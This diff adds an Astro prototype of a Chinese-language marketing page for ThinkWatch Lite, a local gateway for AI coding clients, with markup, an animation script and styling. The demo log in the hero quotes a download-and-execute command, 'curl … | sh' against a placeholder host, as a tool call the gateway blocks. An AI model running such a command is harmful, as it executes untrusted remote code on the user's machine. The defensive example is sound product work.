@@ -1,0 +1,1208 @@
+---
+// Prototype of a redesigned Lite page (not linked, not indexed). Direction:
+// near-black neutral ground, one accent used sparingly, large tight headings,
+// white pill buttons, hairlines instead of boxed cards, and the product shown
+// in motion. See the review thread before rolling any of it out.
+import Base from "~/layouts/Base.astro";
+import { getLatestLiteRelease } from "~/lib/github";
+
+const release = await getLatestLiteRelease();
+const version = release?.tag.replace(/^v/, "") ?? null;
+const dmg = Object.entries(release?.assets ?? {}).find(([n]) => n.endsWith("-arm64.dmg"))?.[1]
+  ?? "https://github.com/ThinkWatchProject/ThinkWatch-Lite/releases/latest";
+
+const clients = ["Claude Code", "Codex", "Claude Desktop", "opencode", "Cursor", "Zed", "Aider", "DeepSeek Harness", "Continue", "Antigravity CLI"];
+
+const story = [
+  {
+    id: "routing",
+    tag: "01 · 路由",
+    title: "按规则分流，失败自动换",
+    body: "按模型、工具、图片、扩展思考等条件把请求分给不同上游。回答开始前上游出错时换用下一个，同一会话固定使用同一上游，提示缓存保持有效。",
+  },
+  {
+    id: "security",
+    tag: "02 · 防护",
+    title: "密钥不交给中转站，恶意工具调用到不了本机",
+    body: "请求发出前，API 密钥、私钥与 JWT 可以换成占位符；回答里若出现下载即执行、外发凭据之类的工具调用，会在客户端执行之前被切断。",
+  },
+  {
+    id: "traffic",
+    tag: "03 · 追溯",
+    title: "每个请求都说得清去向",
+    body: "命中的规则、尝试过的每个上游、格式转换与费用依据，都在请求详情里。已结束的请求可以重放到另一个上游，并排对比。",
+  },
+  {
+    id: "overview",
+    tag: "04 · 费用",
+    title: "费用如实计算",
+    body: "按模型与上游统计 token、费用、缓存节省与首 token 时间。估算的金额单独标注，无法计价的请求单独计数，不按零计入。",
+  },
+];
+---
+
+<Base title="ThinkWatch Lite · 原型" description="Lite 页重新设计的原型" noindex analytics={false}>
+  <div class="proto">
+    <!-- Nav: slim, translucent, one white pill -->
+    <header class="nav">
+      <div class="wrap nav-inner">
+        <a href="/zh-CN/" class="brand"><img src="/favicon.svg" alt="" width="20" height="20" />ThinkWatch</a>
+        <nav class="nav-links" aria-label="主导航">
+          <a href="/zh-CN/lite/" aria-current="page">Lite</a>
+          <a href="/zh-CN/thinkwatch/">企业版</a>
+          <a href="/zh-CN/core/">Core</a>
+          <a href="/zh-CN/docs/">文档</a>
+          <a href="/zh-CN/changelog/">更新日志</a>
+        </nav>
+        <div class="nav-cta">
+          <a class="ghost-link" href="https://github.com/ThinkWatchProject/ThinkWatch-Lite">GitHub</a>
+          <a class="pill pill-sm" href="#download">下载</a>
+        </div>
+      </div>
+    </header>
+
+    <!-- Hero -->
+    <section class="hero">
+      <div class="glow" aria-hidden="true"></div>
+      <div class="wrap">
+        <a class="announce" href="/zh-CN/changelog/"><span class="dot"></span>{version ? `Lite ${version} 已发布` : "Lite 已发布"}<span class="chev">→</span></a>
+        <h1 class="h-hero">Claude Code、Codex 等<br />AI 客户端的本地网关</h1>
+        <div class="hero-row">
+          <p class="lede">客户端只接入一次，之后换上游、换模型都在网关里完成。每个请求的费用与去向都有记录，密钥不交给中转站，恶意工具调用到不了本机。</p>
+          <div class="hero-actions">
+            <a class="pill" href={dmg}>下载 macOS 版</a>
+            <a class="ghost" href="#download">Windows 与 Linux</a>
+          </div>
+        </div>
+
+        <!-- The product in motion: one request through the gateway -->
+        <figure class="flow" data-flow aria-label="示意：一个 Claude Code 请求经过网关，被路由、替换密钥、切断危险工具调用，并记下费用">
+          <div class="flow-top">
+            <span class="lights"><i></i><i></i><i></i></span>
+            <span class="flow-title">ThinkWatch Lite · 实时流量</span>
+            <span class="live"><i></i>LIVE</span>
+          </div>
+          <div class="flow-grid" aria-hidden="true">
+            <div class="col">
+              <p class="col-label">客户端</p>
+              <div class="node on">Claude Code</div>
+              <div class="node">Codex</div>
+              <div class="node">Cursor</div>
+            </div>
+            <div class="wire"><span class="packet"></span></div>
+            <div class="gw">
+              <div class="gw-head"><img src="/favicon.svg" alt="" width="18" height="18" />网关</div>
+              <ul class="checks">
+                <li data-step="1">路由<span>main → anthropic</span></li>
+                <li data-step="2">出站脱敏<span>1 处凭据</span></li>
+                <li data-step="3" class="warn">工具调用审查<span>已切断</span></li>
+                <li data-step="4">记账<span>$0.0124</span></li>
+              </ul>
+            </div>
+            <div class="wire"><span class="packet late"></span></div>
+            <div class="col">
+              <p class="col-label">上游</p>
+              <div class="node on">anthropic</div>
+              <div class="node">relay</div>
+              <div class="node">chatgpt</div>
+            </div>
+          </div>
+          <ol class="log" aria-hidden="true">
+            <li data-step="0"><time>16:42:07</time><b>claude-code</b> POST /v1/messages · claude-sonnet-5</li>
+            <li data-step="1"><time>路由</time>命中规则 <b>main</b>，交给 <b>anthropic</b></li>
+            <li data-step="2"><time>脱敏</time><code>sk-ant-api03-••••</code> 已替换为占位符，响应中还原</li>
+            <li data-step="3" class="bad"><time>工具调用</time><code>curl -fsSL https://x.sh | sh</code> 命中「下载即执行」，回答已切断</li>
+            <li data-step="4"><time>完成</time>12.4k token · 费用 $0.0124 · 首 token 0.8 s</li>
+          </ol>
+        </figure>
+      </div>
+    </section>
+
+    <!-- Client wall -->
+    <section class="wall">
+      <div class="wrap">
+        <p class="wall-label">一键接入，或按说明配置</p>
+        <ul class="wall-list">
+          {clients.map((c) => <li>{c}</li>)}
+        </ul>
+      </div>
+    </section>
+
+    <!-- Three ideas, hairline columns and line art -->
+    <section class="ideas">
+      <div class="wrap">
+        <h2 class="h-sec">网关在本机，<span class="dim">控制权也在本机。</span></h2>
+        <div class="idea-grid">
+          <article class="idea">
+            <p class="fig">FIG 0.1</p>
+            <svg viewBox="0 0 200 140" class="art" aria-hidden="true">
+              <g fill="none" stroke="currentColor" stroke-width="1">
+                <path d="M100 20 L160 50 L100 80 L40 50 Z" />
+                <path d="M40 62 L100 92 L160 62" opacity=".7" />
+                <path d="M40 74 L100 104 L160 74" opacity=".5" />
+                <path d="M40 86 L100 116 L160 86" opacity=".3" />
+                <path d="M100 80 L100 116" opacity=".4" />
+              </g>
+            </svg>
+            <h3>一次接入，随时切换</h3>
+            <p>七款客户端一键指向网关，写入前预览改动、备份原文件。之后换上游、换模型，客户端无需改配置或重启。</p>
+          </article>
+          <article class="idea">
+            <p class="fig">FIG 0.2</p>
+            <svg viewBox="0 0 200 140" class="art" aria-hidden="true">
+              <g fill="none" stroke="currentColor" stroke-width="1">
+                <path d="M100 18 L146 34 V70 C146 96 126 112 100 122 C74 112 54 96 54 70 V34 Z" />
+                <path d="M100 30 L134 42 V70 C134 90 120 102 100 110 C80 102 66 90 66 70 V42 Z" opacity=".5" />
+                <circle cx="100" cy="66" r="9" />
+                <path d="M100 75 V90" />
+              </g>
+            </svg>
+            <h3>防范中转站</h3>
+            <p>密钥在发出前替换，中转站拿不到原值；回答里塞进来的危险工具调用，在客户端执行之前切断。</p>
+          </article>
+          <article class="idea">
+            <p class="fig">FIG 0.3</p>
+            <svg viewBox="0 0 200 140" class="art" aria-hidden="true">
+              <g fill="none" stroke="currentColor" stroke-width="1">
+                <path d="M30 110 H170" opacity=".4" />
+                <path d="M40 110 V60 M62 110 V44 M84 110 V70 M106 110 V32 M128 110 V56 M150 110 V40" />
+                <circle cx="106" cy="32" r="4" />
+              </g>
+            </svg>
+            <h3>每个请求都可追溯</h3>
+            <p>规则、尝试、格式转换与费用依据逐条记录，改规则前可以先试算，已结束的请求可以重放对比。</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <!-- Scroll story: text on the left, one sticky screen on the right -->
+    <section class="story" data-story>
+      <div class="wrap story-grid">
+        <div class="story-steps">
+          <h2 class="h-sec">一个请求，<span class="dim">经过网关的四站。</span></h2>
+          {story.map((s, i) => (
+            <div class="step" data-step-id={s.id} data-active={i === 0 ? "" : undefined}>
+              <p class="step-tag">{s.tag}</p>
+              <h3>{s.title}</h3>
+              <p>{s.body}</p>
+            </div>
+          ))}
+        </div>
+        <div class="story-screen">
+          <div class="screen">
+            {story.map((s, i) => (
+              <img src={`/lite/${s.id}.webp`} alt="" width="2360" height="1540" loading="lazy" data-shot={s.id} data-active={i === 0 ? "" : undefined} />
+            ))}
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Bento -->
+    <section class="bento-sec">
+      <div class="wrap">
+        <h2 class="h-sec">还有这些，<span class="dim">都在一个应用里。</span></h2>
+        <div class="bento">
+          <article class="tile t-menubar">
+            <div class="tile-text">
+              <h3>菜单栏里的今日用量</h3>
+              <p>今日 token 与费用常驻菜单栏，额度将尽变橙、用完变红；点开看各项额度与进行中的请求。Windows 与 Linux 在托盘。</p>
+            </div>
+            <img src="/lite/menubar-menu.webp" alt="" width="664" height="1072" loading="lazy" class="menu-shot" />
+          </article>
+          <article class="tile t-cost">
+            <p class="big">$68.11</p>
+            <p class="big-sub">含估算 $0.441 · 13 条无法计价</p>
+            <h3>估算与实测分开写</h3>
+            <p>无法计价的请求单独计数，不当作零。</p>
+          </article>
+          <article class="tile t-formats">
+            <div class="chips" aria-hidden="true">
+              <span>Anthropic Messages</span><span>OpenAI Chat</span><span>OpenAI Responses</span><span>Gemini</span>
+            </div>
+            <h3>四种接口自动互转</h3>
+            <p>Codex 也能用只支持 Chat Completions 的模型。</p>
+          </article>
+          <article class="tile t-mcp">
+            <img src="/lite/mcp.webp" alt="" width="2360" height="1540" loading="lazy" class="crop" />
+            <div class="tile-text">
+              <h3>扫描 MCP、技能与钩子</h3>
+              <p>八款客户端的 MCP 服务器并列显示，隐藏字符、提示注入与危险命令会被找出。</p>
+            </div>
+          </article>
+          <article class="tile t-remote">
+            <svg viewBox="0 0 240 90" class="remote-art" aria-hidden="true">
+              <g fill="none" stroke="currentColor" stroke-width="1">
+                <rect x="10" y="25" width="64" height="40" rx="6" />
+                <rect x="166" y="20" width="64" height="50" rx="6" />
+                <path d="M74 45 H166" stroke-dasharray="3 4" class="dash" />
+              </g>
+              <text x="42" y="49" text-anchor="middle">Lite</text>
+              <text x="198" y="49" text-anchor="middle">twcore</text>
+            </svg>
+            <h3>也能管理服务器上的网关</h3>
+            <p>twcore 装在 Linux 服务器上，应用经 Noise 加密通道连接，不涉及证书。</p>
+          </article>
+          <article class="tile t-keys">
+            <ul class="keyrows" aria-hidden="true">
+              <li><b>claude-code</b><span>main</span><em>$4.21</em></li>
+              <li><b>codex</b><span>main</span><em>$2.87</em></li>
+              <li><b>cursor</b><span>budget</span><em>$0.93</em></li>
+            </ul>
+            <h3>每个客户端一把密钥</h3>
+            <p>流量与费用按客户端分开，路由与可见模型各自设置。</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <!-- Download -->
+    <section class="cta" id="download">
+      <div class="glow glow-low" aria-hidden="true"></div>
+      <div class="wrap cta-inner">
+        <h2 class="h-cta">下载 ThinkWatch Lite</h2>
+        <p class="lede center">macOS 12 及以上（Apple silicon）、Windows 10 21H2 及以上（x64、ARM64）、Linux（x86_64、aarch64）。MIT 开源，自动更新。</p>
+        <div class="hero-actions center">
+          <a class="pill" href={dmg}>下载 macOS 版</a>
+          <a class="ghost" href="/zh-CN/lite/#install">Windows 与 Linux</a>
+        </div>
+        <div class="cmd"><span>$</span> brew install --cask thinkwatchproject/tap/thinkwatch-lite</div>
+      </div>
+    </section>
+
+    <footer class="foot">
+      <div class="wrap foot-inner">
+        <span class="brand"><img src="/favicon.svg" alt="" width="16" height="16" />ThinkWatch</span>
+        <span class="dim">原型 · 不代表最终设计</span>
+      </div>
+    </footer>
+  </div>
+</Base>
+
+<script is:inline>
+  (() => {
+    const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+    // Hero: step through one request, then start again.
+    const flow = document.querySelector("[data-flow]");
+    if (flow) {
+      const items = flow.querySelectorAll("[data-step]");
+      let step = reduce ? 4 : -1;
+      const paint = () => items.forEach((el) => el.toggleAttribute("data-on", Number(el.dataset.step) <= step));
+      paint();
+      if (!reduce) {
+        setInterval(() => {
+          step = step >= 6 ? -1 : step + 1;
+          flow.toggleAttribute("data-running", step >= 0 && step <= 4);
+          paint();
+        }, 900);
+      }
+    }
+
+    // Story: the step nearest the middle of the screen picks the screenshot.
+    const story = document.querySelector("[data-story]");
+    if (story) {
+      const steps = [...story.querySelectorAll("[data-step-id]")];
+      const shots = [...story.querySelectorAll("[data-shot]")];
+      const io = new IntersectionObserver(
+        (entries) => {
+          for (const e of entries) {
+            if (!e.isIntersecting) continue;
+            const id = e.target.dataset.stepId;
+            steps.forEach((s) => s.toggleAttribute("data-active", s === e.target));
+            shots.forEach((s) => s.toggleAttribute("data-active", s.dataset.shot === id));
+          }
+        },
+        { rootMargin: "-45% 0px -45% 0px" },
+      );
+      steps.forEach((s) => io.observe(s));
+    }
+  })();
+</script>
+
+<style is:global>
+  body:has(.proto) {
+    background: #08090a;
+  }
+</style>
+
+<style>
+  .proto {
+    --bg: #08090a;
+    --panel: #0f1012;
+    --panel-2: #141518;
+    --line: rgba(255, 255, 255, 0.08);
+    --line-2: rgba(255, 255, 255, 0.14);
+    --text: #f7f8f8;
+    --muted: #8a8f98;
+    --faint: #62666d;
+    --accent: #3ddbd9;
+    --danger: #ff6b6b;
+    color: var(--text);
+    background: var(--bg);
+    font-family: var(--font-sans);
+    -webkit-font-smoothing: antialiased;
+    overflow-x: clip;
+  }
+  .wrap {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 24px;
+  }
+  .dim {
+    color: var(--muted);
+  }
+
+  /* Nav */
+  .nav {
+    position: sticky;
+    top: 0;
+    z-index: 20;
+    border-bottom: 1px solid var(--line);
+    background: rgba(8, 9, 10, 0.7);
+    backdrop-filter: saturate(160%) blur(14px);
+  }
+  .nav-inner {
+    display: flex;
+    height: 60px;
+    align-items: center;
+    justify-content: space-between;
+    gap: 24px;
+  }
+  .brand {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-weight: 600;
+    font-size: 15px;
+    letter-spacing: -0.01em;
+  }
+  .nav-links {
+    display: none;
+    gap: 28px;
+    font-size: 14px;
+    color: var(--muted);
+  }
+  .nav-links a:hover,
+  .nav-links a[aria-current] {
+    color: var(--text);
+  }
+  @media (min-width: 900px) {
+    .nav-links {
+      display: flex;
+    }
+  }
+  .nav-cta {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+  }
+  .ghost-link {
+    font-size: 14px;
+    color: var(--muted);
+  }
+  .ghost-link:hover {
+    color: var(--text);
+  }
+
+  /* Buttons */
+  .pill {
+    display: inline-flex;
+    height: 44px;
+    align-items: center;
+    border-radius: 999px;
+    background: #f7f8f8;
+    padding: 0 22px;
+    font-size: 15px;
+    font-weight: 560;
+    color: #08090a;
+    transition: background 160ms, transform 160ms;
+  }
+  .pill:hover {
+    background: #fff;
+    transform: translateY(-1px);
+  }
+  .pill-sm {
+    height: 34px;
+    padding: 0 16px;
+    font-size: 14px;
+  }
+  .ghost {
+    display: inline-flex;
+    height: 44px;
+    align-items: center;
+    border-radius: 999px;
+    border: 1px solid var(--line-2);
+    padding: 0 20px;
+    font-size: 15px;
+    color: var(--text);
+    transition: background 160ms, border-color 160ms;
+  }
+  .ghost:hover {
+    background: rgba(255, 255, 255, 0.04);
+    border-color: rgba(255, 255, 255, 0.24);
+  }
+
+  /* Hero */
+  .hero {
+    position: relative;
+    padding: 88px 0 72px;
+  }
+  .glow {
+    position: absolute;
+    inset: -200px 0 auto;
+    height: 760px;
+    background:
+      radial-gradient(600px 300px at 70% 30%, rgba(61, 219, 217, 0.13), transparent 70%),
+      radial-gradient(500px 260px at 20% 10%, rgba(120, 140, 255, 0.08), transparent 70%);
+    pointer-events: none;
+    /* fade out before the box ends, or its bottom edge shows as a band */
+    -webkit-mask-image: linear-gradient(#000 45%, transparent 95%);
+    mask-image: linear-gradient(#000 45%, transparent 95%);
+  }
+  .glow-low {
+    inset: auto 0 -120px;
+    height: 520px;
+    background: radial-gradient(520px 260px at 50% 60%, rgba(61, 219, 217, 0.12), transparent 70%);
+    -webkit-mask-image: linear-gradient(transparent 5%, #000 55%);
+    mask-image: linear-gradient(transparent 5%, #000 55%);
+  }
+  .announce {
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    border: 1px solid var(--line-2);
+    border-radius: 999px;
+    padding: 6px 14px 6px 10px;
+    font-size: 13px;
+    color: var(--muted);
+    background: rgba(255, 255, 255, 0.02);
+  }
+  .announce:hover {
+    color: var(--text);
+  }
+  .announce .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 99px;
+    background: var(--accent);
+    box-shadow: 0 0 10px var(--accent);
+  }
+  .announce .chev {
+    color: var(--faint);
+  }
+  .h-hero {
+    position: relative;
+    margin: 28px 0 0;
+    font-size: clamp(40px, 6.4vw, 76px);
+    line-height: 1.08;
+    font-weight: 600;
+    letter-spacing: -0.035em;
+    background: linear-gradient(180deg, #fff 30%, #b9bec6);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+  .hero-row {
+    position: relative;
+    margin-top: 28px;
+    display: flex;
+    flex-wrap: wrap;
+    align-items: flex-end;
+    justify-content: space-between;
+    gap: 24px 48px;
+  }
+  .lede {
+    margin: 0;
+    max-width: 560px;
+    font-size: 18px;
+    line-height: 1.65;
+    color: var(--muted);
+  }
+  .lede.center {
+    margin: 20px auto 0;
+    text-align: center;
+    text-wrap: balance;
+  }
+  .hero-actions {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  .hero-actions.center {
+    justify-content: center;
+    margin-top: 32px;
+  }
+
+  /* Flow panel */
+  .flow {
+    position: relative;
+    margin: 64px 0 0;
+    border: 1px solid var(--line-2);
+    border-radius: 16px;
+    background: linear-gradient(180deg, rgba(20, 21, 24, 0.9), rgba(12, 13, 15, 0.9));
+    box-shadow:
+      0 0 0 1px rgba(255, 255, 255, 0.02) inset,
+      0 40px 120px -40px rgba(61, 219, 217, 0.25),
+      0 30px 80px -30px rgba(0, 0, 0, 0.8);
+    overflow: hidden;
+  }
+  .flow::before {
+    content: "";
+    position: absolute;
+    inset: 0 0 auto;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.35), transparent);
+  }
+  .flow-top {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    border-bottom: 1px solid var(--line);
+    padding: 12px 16px;
+    font-size: 12px;
+    color: var(--muted);
+  }
+  .lights {
+    display: inline-flex;
+    gap: 6px;
+  }
+  .lights i {
+    width: 10px;
+    height: 10px;
+    border-radius: 99px;
+    background: #2a2c31;
+  }
+  .flow-title {
+    flex: 1;
+  }
+  .live {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    letter-spacing: 0.08em;
+    color: var(--accent);
+  }
+  .live i {
+    width: 6px;
+    height: 6px;
+    border-radius: 99px;
+    background: var(--accent);
+    animation: blink 1.6s ease-in-out infinite;
+  }
+  .flow-grid {
+    display: grid;
+    grid-template-columns: 1fr 60px 1.3fr 60px 1fr;
+    align-items: center;
+    gap: 0;
+    padding: 32px 28px 20px;
+  }
+  .col {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+  .col-label {
+    margin: 0 0 4px;
+    font-size: 12px;
+    color: var(--faint);
+  }
+  .node {
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 10px 12px;
+    font-size: 13px;
+    color: var(--faint);
+    background: rgba(255, 255, 255, 0.015);
+  }
+  .node.on {
+    color: var(--text);
+    border-color: rgba(61, 219, 217, 0.45);
+    background: rgba(61, 219, 217, 0.06);
+  }
+  .wire {
+    position: relative;
+    height: 1px;
+    background: linear-gradient(90deg, rgba(61, 219, 217, 0.1), rgba(61, 219, 217, 0.5), rgba(61, 219, 217, 0.1));
+  }
+  .packet {
+    position: absolute;
+    top: -3px;
+    left: 0;
+    width: 7px;
+    height: 7px;
+    border-radius: 99px;
+    background: var(--accent);
+    box-shadow: 0 0 12px var(--accent);
+    opacity: 0;
+  }
+  .flow[data-running] .packet {
+    animation: travel 1.2s ease-in-out infinite;
+  }
+  .flow[data-running] .packet.late {
+    animation-delay: 0.6s;
+  }
+  .gw {
+    border: 1px solid var(--line-2);
+    border-radius: 14px;
+    padding: 16px;
+    background: var(--panel-2);
+    box-shadow: 0 0 60px -20px rgba(61, 219, 217, 0.35);
+  }
+  .gw-head {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 14px;
+    font-weight: 600;
+  }
+  .checks {
+    margin: 14px 0 0;
+    padding: 0;
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+  .checks li {
+    display: flex;
+    justify-content: space-between;
+    gap: 12px;
+    font-size: 13px;
+    color: var(--faint);
+    transition: color 300ms;
+  }
+  .checks li::before {
+    content: "";
+    width: 6px;
+    height: 6px;
+    margin-top: 7px;
+    margin-right: -4px;
+    border-radius: 99px;
+    background: #2a2c31;
+    transition: background 300ms, box-shadow 300ms;
+  }
+  .checks li span {
+    margin-left: auto;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    opacity: 0;
+    transition: opacity 300ms;
+  }
+  .checks li[data-on] {
+    color: var(--text);
+  }
+  .checks li[data-on]::before {
+    background: var(--accent);
+    box-shadow: 0 0 8px var(--accent);
+  }
+  .checks li[data-on] span {
+    opacity: 1;
+    color: var(--muted);
+  }
+  .checks li.warn[data-on]::before {
+    background: var(--danger);
+    box-shadow: 0 0 8px var(--danger);
+  }
+  .checks li.warn[data-on] span {
+    color: var(--danger);
+  }
+  .log {
+    margin: 0;
+    padding: 14px 28px 22px;
+    list-style: none;
+    border-top: 1px solid var(--line);
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+    line-height: 2;
+    color: var(--muted);
+  }
+  .log li {
+    display: flex;
+    gap: 16px;
+    opacity: 0.18;
+    transition: opacity 400ms;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .log li[data-on] {
+    opacity: 1;
+  }
+  .log time {
+    flex: 0 0 72px;
+    color: var(--faint);
+  }
+  .log b {
+    font-weight: 500;
+    color: var(--text);
+  }
+  .log code {
+    color: #e5c07b;
+  }
+  .log li.bad code {
+    color: var(--danger);
+    text-decoration: line-through;
+    text-decoration-color: rgba(255, 107, 107, 0.6);
+  }
+  @media (max-width: 760px) {
+    .flow-grid {
+      grid-template-columns: 1fr;
+      gap: 14px;
+    }
+    .wire {
+      display: none;
+    }
+    .col {
+      flex-direction: row;
+      flex-wrap: wrap;
+    }
+    .col-label {
+      width: 100%;
+    }
+    .log {
+      padding: 12px 16px 18px;
+      font-size: 11.5px;
+    }
+    .log time {
+      flex-basis: 56px;
+    }
+  }
+
+  /* Client wall */
+  .wall {
+    border-top: 1px solid var(--line);
+    border-bottom: 1px solid var(--line);
+    padding: 36px 0;
+  }
+  .wall-label {
+    margin: 0 0 18px;
+    text-align: center;
+    font-size: 13px;
+    color: var(--faint);
+  }
+  .wall-list {
+    margin: 0;
+    padding: 0;
+    list-style: none;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 12px 30px;
+    font-size: 15.5px;
+    font-weight: 560;
+    letter-spacing: -0.01em;
+    color: #9ca1a9;
+  }
+
+  /* Section heads */
+  .h-sec {
+    margin: 0;
+    max-width: 820px;
+    font-size: clamp(30px, 4vw, 48px);
+    line-height: 1.12;
+    font-weight: 600;
+    letter-spacing: -0.03em;
+  }
+
+  /* Ideas */
+  .ideas {
+    padding: 120px 0 40px;
+  }
+  .idea-grid {
+    margin-top: 56px;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    border-top: 1px solid var(--line);
+  }
+  .idea {
+    padding: 28px 28px 8px;
+    border-left: 1px solid var(--line);
+  }
+  .idea:first-child {
+    border-left: 0;
+    padding-left: 0;
+  }
+  .fig {
+    margin: 0;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    letter-spacing: 0.08em;
+    color: var(--faint);
+  }
+  .art {
+    display: block;
+    width: 100%;
+    max-width: 240px;
+    margin: 18px auto 26px;
+    color: #5b6068;
+  }
+  .idea h3,
+  .step h3,
+  .tile h3 {
+    margin: 0;
+    font-size: 17px;
+    font-weight: 600;
+    letter-spacing: -0.01em;
+  }
+  .idea p:not(.fig),
+  .tile p {
+    margin: 8px 0 0;
+    font-size: 15px;
+    line-height: 1.65;
+    color: var(--muted);
+  }
+  @media (max-width: 860px) {
+    .idea-grid {
+      grid-template-columns: 1fr;
+    }
+    .idea,
+    .idea:first-child {
+      border-left: 0;
+      padding: 28px 0 8px;
+      border-top: 1px solid var(--line);
+    }
+    .idea:first-child {
+      border-top: 0;
+    }
+  }
+
+  /* Story */
+  .story {
+    padding: 120px 0;
+  }
+  .story-grid {
+    display: grid;
+    grid-template-columns: minmax(0, 0.8fr) minmax(0, 1.2fr);
+    gap: 64px;
+  }
+  .step {
+    min-height: 62vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    border-left: 1px solid var(--line);
+    padding-left: 24px;
+    opacity: 0.35;
+    transition: opacity 400ms, border-color 400ms;
+  }
+  .step:first-of-type {
+    margin-top: 24px;
+  }
+  .step[data-active] {
+    opacity: 1;
+    border-color: var(--accent);
+  }
+  .step-tag {
+    margin: 0 0 10px;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    letter-spacing: 0.06em;
+    color: var(--accent);
+  }
+  .step h3 {
+    font-size: 26px;
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+  }
+  .step p:last-child {
+    margin: 14px 0 0;
+    font-size: 16px;
+    line-height: 1.7;
+    color: var(--muted);
+  }
+  .story-screen {
+    position: relative;
+  }
+  .screen {
+    position: sticky;
+    top: calc(50vh - 220px);
+    aspect-ratio: 2360 / 1540;
+    border-radius: 14px;
+    box-shadow:
+      0 0 0 1px var(--line-2),
+      0 50px 120px -40px rgba(0, 0, 0, 0.9),
+      0 30px 100px -50px rgba(61, 219, 217, 0.3);
+    overflow: hidden;
+    background: var(--panel);
+  }
+  .screen img {
+    position: absolute;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    opacity: 0;
+    transform: scale(1.02);
+    transition: opacity 500ms, transform 700ms;
+  }
+  .screen img[data-active] {
+    opacity: 1;
+    transform: none;
+  }
+  @media (max-width: 900px) {
+    .story-grid {
+      grid-template-columns: 1fr;
+    }
+    .story-screen {
+      display: none;
+    }
+    .step {
+      min-height: 0;
+      padding: 28px 0 28px 20px;
+      opacity: 1;
+    }
+  }
+
+  /* Bento */
+  .bento-sec {
+    padding: 40px 0 120px;
+  }
+  .bento {
+    margin-top: 56px;
+    display: grid;
+    grid-template-columns: repeat(6, minmax(0, 1fr));
+    gap: 12px;
+  }
+  .tile {
+    position: relative;
+    overflow: hidden;
+    border-radius: 16px;
+    border: 1px solid var(--line);
+    background: linear-gradient(180deg, var(--panel-2), var(--panel));
+    padding: 28px;
+    transition: border-color 200ms;
+  }
+  .tile:hover {
+    border-color: var(--line-2);
+  }
+  .t-menubar {
+    grid-column: span 4;
+    grid-row: span 2;
+    display: grid;
+    grid-template-columns: minmax(0, 1fr) 260px;
+    gap: 24px;
+    align-items: end;
+  }
+  .t-menubar .menu-shot {
+    width: 260px;
+    margin-bottom: -60px;
+    border-radius: 12px;
+    box-shadow: 0 30px 80px -20px rgba(0, 0, 0, 0.8), 0 0 0 1px var(--line-2);
+  }
+  .t-cost,
+  .t-formats,
+  .t-remote,
+  .t-keys {
+    grid-column: span 2;
+  }
+  .t-mcp {
+    grid-column: span 4;
+    display: grid;
+    grid-template-columns: minmax(0, 1.4fr) minmax(0, 1fr);
+    gap: 24px;
+    align-items: center;
+    padding: 0 28px 0 0;
+  }
+  .t-mcp .crop {
+    height: 100%;
+    min-height: 220px;
+    object-fit: cover;
+    object-position: left top;
+    border-right: 1px solid var(--line);
+  }
+  .big {
+    margin: 0 !important;
+    font-size: 44px !important;
+    font-weight: 600;
+    letter-spacing: -0.03em;
+    color: var(--text) !important;
+    line-height: 1.1 !important;
+  }
+  .big-sub {
+    margin: 6px 0 22px !important;
+    font-family: var(--font-mono);
+    font-size: 12px !important;
+    color: #e5c07b !important;
+  }
+  .chips {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-bottom: 22px;
+  }
+  .chips span {
+    border: 1px solid var(--line-2);
+    border-radius: 999px;
+    padding: 5px 11px;
+    font-size: 12px;
+    color: var(--muted);
+    animation: chip 4s ease-in-out infinite;
+  }
+  .chips span:nth-child(2) {
+    animation-delay: 1s;
+  }
+  .chips span:nth-child(3) {
+    animation-delay: 2s;
+  }
+  .chips span:nth-child(4) {
+    animation-delay: 3s;
+  }
+  .remote-art {
+    display: block;
+    width: 100%;
+    max-width: 260px;
+    margin-bottom: 18px;
+    color: #5b6068;
+  }
+  .remote-art text {
+    fill: var(--muted);
+    font-size: 12px;
+    font-family: var(--font-mono);
+  }
+  .remote-art .dash {
+    stroke: var(--accent);
+    animation: dash 1.2s linear infinite;
+  }
+  .keyrows {
+    margin: 0 0 22px;
+    padding: 0;
+    list-style: none;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+  }
+  .keyrows li {
+    display: flex;
+    gap: 12px;
+    border-bottom: 1px solid var(--line);
+    padding: 7px 0;
+    color: var(--muted);
+  }
+  .keyrows b {
+    flex: 1;
+    font-weight: 500;
+    color: var(--text);
+  }
+  .keyrows em {
+    font-style: normal;
+    color: var(--text);
+  }
+  @media (max-width: 900px) {
+    .bento {
+      grid-template-columns: 1fr;
+    }
+    .tile,
+    .t-menubar,
+    .t-mcp {
+      grid-column: auto;
+      grid-row: auto;
+    }
+    .t-menubar {
+      grid-template-columns: 1fr;
+    }
+    .t-menubar .menu-shot {
+      margin: 0 auto -80px;
+    }
+    .t-mcp {
+      grid-template-columns: 1fr;
